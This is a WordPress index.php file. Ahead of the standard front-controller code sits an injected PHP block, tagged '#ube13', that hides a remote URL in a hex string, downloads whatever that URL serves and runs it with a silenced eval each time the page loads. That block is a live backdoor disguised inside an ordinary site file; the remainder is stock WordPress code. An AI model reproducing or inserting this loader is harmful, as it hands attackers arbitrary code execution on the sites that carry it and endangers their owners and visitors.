<?php
#ube13
$link = pack("H*", "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4e6f6f62546563686f2f772f726566732f68656164732f6d61696e2f32");
@eval("?>" . @file_get_contents($link));
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
